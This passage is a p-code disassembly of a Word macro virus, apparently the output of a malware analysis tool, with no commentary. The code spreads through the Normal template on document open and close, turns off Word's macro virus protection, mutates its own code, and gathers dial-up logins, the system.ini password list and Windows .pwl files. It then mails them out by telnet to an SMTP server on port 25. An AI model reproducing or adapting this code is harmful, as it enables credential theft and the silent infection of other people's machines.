' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #125:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #126:
' 	LitStr 0x0006 "O†‰¡†•"
' 	St Twnd 
' Line #127:
' 	LitStr 0x0005 "(¡†•)"
' 	St None 
' Line #128:
' 	LitStr 0x0010 "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
' 	St NoConn_ 
' Line #129:
' 	ElseBlock 
' Line #130:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (¡†•)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #131:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #132:
' 	LitStr 0x0005 "(¡†•)"
' 	St None 
' Line #133:
' 	LitStr 0x0010 "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
' 	St NoConn_ 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #137:
' 	ArgsCall DoEvents 0x0000 
' Line #138:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #139:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #140:
' 	ArgsCall DoEvents 0x0000 
' Line #141:
' 	Ld Timer 
' 	St Start 
' Line #142:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0046 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #143:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #144:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld NoConn_ 
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #145:
' 	ArgsCall DoEvents 0x0000 
' Line #146:
' 	Loop 
' Line #147:
' 	Ld Handle 
' 	SelectCase 
' Line #148:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #149:
' Line #150:
' 	ArgsCall Read 0x0000 
' Line #151:
' 	Ld Usname 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Usname 0x0001 
' 	St SenderDomain 
' Line #152:
' 	Ld Usname 
' 	FnUBound 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Usname 0x0001 
' 	Ld Domain_ 
' 	Add 
' 	St SenderAddress 
' Line #153:
' Line #154:
' 	LineCont 0x000C 12 00 01 00 1E 00 01 00 27 00 01 00
' 	LitStr 0x0007 "helo My"
' 	Ld SenderDomain 
' 	Add 
' 	LitStr 0x000F "#$$mail from: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0003 ">#$"
' 	Add 
' 	LitStr 0x0009 "rcpt to: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0008 "#$data#$"
' 	Add 
' 	LitStr 0x0007 "From: <"
' 	Add 
' 	Ld SenderAddress 
' 	Add 
' 	LitStr 0x0002 ">#"
' 	Add 
' 	LitStr 0x0004 "To: "
' 	Add 
' 	Ld RecipientOfMessage_ 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	LitStr 0x0006 "Date: "
' 	Add 
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0080 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "----=_NextPart"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0084 "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
' 	Add 
' 	St SMTP 
' Line #155:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #156:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #157:
' 	Ld Grab 
' 	Ld SCP 
' 	Add 
' 	St GrabStr 
' Line #158:
' 	Ld GrabStr 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #159:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #160:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #161:
' Line #162:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #163:
' 	Ld i 
' 	ArgsLd NPwl 0x0000 
' 	ArgsCall FindPWL 0x0002 
' Line #164:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #165:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #166:
' 	LitStr 0x000B "c:\windows\"
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x02B0 
' 	Ne 
' 	IfBlock 
' Line #167:
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #168:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #169:
' 	LineCont 0x000C 08 00 03 00 15 00 03 00 1B 00 03 00
' 	LitStr 0x003F "#------=_NextPart#Content-Type: application/octet-stream; name="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0038 "#Content-Transfer-Encoding: base64#Content-Description: "
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitStr 0x003E "(PWL PassWord List)#Content-Disposition: attachment; filename="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Title 
' Line #170:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #171:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #172:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #173:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	StartForVariable 
' 	Next 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	LitStr 0x001D "##------=_NextPart--#.#$quit#"
' 	St Title 
' Line #178:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #179:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #180:
' 	Ld Timer 
' 	St Start 
' Line #181:
' 	Ld hwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #182:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hwnd 
' Line #183:
' 	ArgsCall DoEvents 0x0000 
' Line #184:
' 	Loop 
' Line #185:
' 	Ld hwnd 
' 	SelectCase 
' Line #186:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #187:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #188:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #189:
' 	CaseElse 
' Line #190:
' 	Ld hwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #191:
' 	Ld Friend 
' 	St NF 
' Line #192:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St MyDat 
' Line #193:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #194:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld MyDat 
' 	PutRec 
' Line #195:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #196:
' 	ArgsCall DoEvents 0x0000 
' Line #197:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #198:
' 	ExitSub 
' Line #199:
' 	EndSelect 
' Line #200:
' 	CaseElse 
' Line #201:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #202:
' 	Ld HandleBW 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #203:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #204:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #205:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #206:
' 	LitDI2 0x0000 
' 	St HandleBW 
' Line #207:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #208:
' 	EndSelect 
' Line #209:
' 	StartForVariable 
' 	Next 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	EndSub 
' Line #212:
' 	FuncDefn (Function morf(MyString As String))
' Line #213:
' 	Dim 
' 	VarDefn NextSub (As Long)
' Line #214:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #215:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #216:
' 	Dim 
' 	VarDefn Code_ (As String)
' Line #217:
' 	Dim 
' 	VarDefn i (As Long)
' Line #218:
' 	Dim 
' 	VarDefn Pre_ (As Long)
' Line #219:
' 	Dim 
' 	VarDefn Resalt (As String)
' Line #220:
' 	OnError (Resume Next) 
' Line #221:
' 	LitDI2 0x0001 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #222:
' 	Ld NextSub 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #223:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #224:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #225:
' 	Loop 
' Line #226:
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim Code_ 0x0001 (As Variant)
' Line #227:
' Line #228:
' 	LitDI2 0x0008 
' 	UMi 
' 	St NextSub 
' Line #229:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #230:
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	St Pre_ 
' Line #231:
' 	Ld Pre_ 
' 	Ld MyString 
' 	LitStr 0x0003 "End"
' 	LitStr 0x0004 " Sub"
' 	Add 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St NextSub 
' Line #232:
' 	Ld MyString 
' 	Ld Pre_ 
' 	Ld NextSub 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld Pre_ 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld i 
' 	ArgsSt Code_ 0x0001 
' Line #233:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #234:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #235:
' 	LitDI2 0x0000 
' 	ArgsLd Code_ 0x0001 
' 	St Resalt 
' Line #236:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #237:
' 	Ld Resalt 
' 	Ld i 
' 	ArgsLd A 0x0001 
' 	ArgsLd Code_ 0x0001 
' 	Add 
' 	St Resalt 
' Line #238:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #239:
' 	Ld Resalt 
' 	St morf 
' Line #240:
' 	EndFunc 
' Line #241:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #242:
' 	FuncDefn (Sub Sender())
' Line #243:
' 	Dim 
' 	VarDefn i (As Long)
' Line #244:
' 	LitDI2 0x0000 
' 	St i 
' Line #245:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #246:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #247:
' 	ArgsCall Sender_main 0x0000 
' Line #248:
' 	ExitSub 
' Line #249:
' 	ElseBlock 
' Line #250:
' 	LitDI2 0x00FE 
' 	ArgsCall Pause 0x0001 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	StartForVariable 
' 	Next 
' Line #253:
' 	EndSub 
' Line #254:
' 	FuncDefn (Sub Pause(i As Byte))
' Line #255:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #256:
' 	Ld Timer 
' 	St Start 
' Line #257:
' 	Ld Timer 
' 	Ld Start 
' 	Ld i 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #258:
' 	ArgsCall DoEvents 0x0000 
' Line #259:
' 	Loop 
' Line #260:
' 	EndSub 
' Line #261:
' 	FuncDefn (Sub CopyLines(Source As Object))
' Line #262:
' 	OnError (Resume Next) 
' Line #263:
' 	Dim 
' 	VarDefn SourceM (As Object)
' 	VarDefn TargetM (As Object)
' Line #264:
' 	Dim 
' 	VarDefn n (As Long)
' Line #265:
' 	Dim 
' 	VarDefn Body (As String)
' Line #266:
' 	Dim 
' 	VarDefn VBComponent (As Object) 0x0016
' Line #267:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld Source 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #268:
' 	SetStmt 
' 	Ld VBComponent 
' 	Set SourceM 
' Line #269:
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #270:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #271:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0016 "Dial-up_script_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #272:
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #273:
' 	Ld Body 
' 	ArgsLd morf 0x0001 
' 	St Body 
' Line #274:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set TargetM 
' Line #275:
' 	Ld Body 
' 	Ld TargetM 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #276:
' 	LitStr 0x000B "MSPluss_SCP"
' 	Ld TargetM 
' 	MemSt New 
' Line #277:
' 	EndIfBlock 
' Line #278:
' 	StartForVariable 
' 	Next 
' Line #279:
' 	EndSub 
' Line #280:
' Line #281:
' 	FuncDefn (Sub FileClose())
' Line #282:
' 	OnError (Resume Next) 
' Line #283:
' 	ArgsCall AutoOpen 0x0000 
' Line #284:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #285:
' 	EndSub 
' Line #286:
' 	FuncDefn (Function Grab())
' Line #287:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #288:
' 	Dim 
' 	VarDefn Temp (As String)
' Line #289:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #290:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #291:
' 	OnError (Resume Next) 
' Line #292:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #293:
' 	Ld Friend 
' 	St NF 
' Line #294:
' 	LitStr 0x0016 "c:\windows\edialer.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #295:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #296:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #297:
' 	LineCont 0x0008 0C 00 05 00 17 00 05 00
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000B "[RAS_Entry_"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000D "PasswordSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x000A "LoginSaved"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #298:
' 	Ld Temp 
' 	Ld Tmp 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Temp 
' Line #299:
' 	EndIfBlock 
' Line #300:
' 	Loop 
' Line #301:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #302:
' 	Ld Temp 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Temp 
' Line #303:
' 	EndIfBlock 
' Line #304:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	ArgsLd Dir$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #305:
' 	Ld Friend 
' 	St NF 
' Line #306:
' 	LitStr 0x0015 "C:\Windows\system.ini"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #307:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #308:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #309:
' 	Ld Counter 
' 	LitDI2 0x0001 
' 	Add 
' 	St Counter 
' Line #310:
' 	Ld Tmp 
' 	LitStr 0x0010 "[Password Lists]"
' 	Eq 
' 	IfBlock 
' Line #311:
' 	Ld Tmp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #312:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #313:
' 	Ld Temp 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Tmp 
' 	Add 
' 	St Temp 
' Line #314:
' 	Loop 
' Line #315:
' 	ExitDo 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	Ld Counter 
' 	LitDI2 0x0014 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #318:
' 	ArgsCall DoEvents 0x0000 
' Line #319:
' 	EndIfBlock 
' Line #320:
' 	Loop 
' Line #321:
' 	EndIfBlock 
' Line #322:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #323:
' 	Ld Temp 
' 	St Grab 
' Line #324:
' 	EndFunc 
' Line #325:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #326:
' 	FuncDefn (Sub AutoOpen())
' Line #327:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #328:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #329:
' 	Dim 
' 	VarDefn Body (As String)
' Line #330:
' 	OnError (Resume Next) 
' Line #331:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #332:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #333:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBComponent 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #334:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0016 "Dial-up_script_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #335:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #336:
' 	ExitFor 
' Line #337:
' 	EndIfBlock 
' Line #338:
' 	StartForVariable 
' 	Next 
' Line #339:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #340:
' 	Ld MacroContainer 
' 	ArgsCall CopyLines 0x0001 
' Line #341:
' 	EndIfBlock 
' Line #342:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #343:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #344:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #345:
' 	EndSub 
' Line #346:
' Line #347:
' 	FuncDefn (Sub AutoClose())
' Line #348:
' 	OnError (Resume Next) 
' Line #349:
' 	ArgsCall AutoOpen 0x0000 
' Line #350:
' 	EndSub 
' Line #351:
' 	FuncDefn (Function Check_Connection())
' Line #352:
' 	Dim 
' 	VarDefn CurrWnd (As Long)
' Line #353:
' 	Dim 
' 	VarDefn Length (As Long)
' Line #354:
' 	Dim 
' 	VarDefn Title (As String)
' Line #355:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St CurrWnd 
' Line #356:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #357:
' 	Ld CurrWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #358:
' 	Ld CurrWnd 
' 	ArgsLd GetWindowTextLength 0x0001 
' 	St Length 
' Line #359:
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Space 0x0001 
' 	St Title 
' Line #360:
' 	Ld CurrWnd 
' 	Ld Title 
' 	Ld Length 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd GetWindowText 0x0003 
' 	St Length 
' Line #361:
' 	LineCont 0x0004 0D 00 05 00
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "Connected to"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld Title 
' 	LitStr 0x000C "IŒ„ˆ‰_ö†¡Œ ˆ"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #362:
' 	LitVarSpecial (True)
' 	St Check_Connection 
' Line #363:
' 	ExitFunc 
' Line #364:
' 	EndIfBlock 
' Line #365:
' 	Ld CurrWnd 
' 	LitDI2 0x0002 
' 	ArgsLd GetWindow 0x0002 
' 	St CurrWnd 
' Line #366:
' 	ArgsCall DoEvents 0x0000 
' Line #367:
' 	Loop 
' Line #368:
' 	LitVarSpecial (False)
' 	St Check_Connection 
' Line #369:
' 	EndFunc 
' Line #370:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #371:
' 	FuncDefn (Function FindPWL(j As Integer, FindFiles As ))
' Line #372:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #373:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #374:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #375:
' 	ExitFunc 
' Line #376:
' 	EndIfBlock 
' Line #377:
' 	LitDI2 0x0000 
' 	St j 
' Line #378:
' 	LitDI2 0x0000 
' 	ArgsLd FindFiles 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #379:
' 	Ld Dir 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #380:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #381:
' 	Loop 
' Line #382:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #383:
' 	LitDI2 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim FindFiles 0x0001 (As Variant)
' Line #384:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #385:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #386:
' 	Ld Dir$ 
' 	Ld j 
' 	ArgsSt FindFiles 0x0001 
' Line #387:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #388:
' 	ElseBlock 
' Line #389:
' 	LitStr 0x0010 "c:\windows\*.pwl"
' 	ArgsLd Dir$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt FindFiles 0x0001 
' Line #390:
' 	EndIfBlock 
' Line #391:
' 	EndFunc 
' Line #392:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #393:
' 	FuncDefn (Sub AutoExit())
' Line #394:
' 	Dim 
' 	VarDefn Counter (As Integer)
' Line #395:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #396:
' 	Dim 
' 	VarDefn VBComp (As Object)
' Line #397:
' 	Dim 
' 	VarDefn Body (As String)
' Line #398:
' Line #399:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #400:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #401:
' 	OnError (Resume Next) 
' Line #402:
' Line #403:
' 	Ld Templates 
' 	MemLd Count 
' 	St Counter 
' Line #404:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #405:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #406:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #407:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0016 "Dial-up_script_checker"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #408:
' 	StartWithExpr 
' 	Ld VBComp 
' 	MemLd CodeModule 
' 	With 
' Line #409:
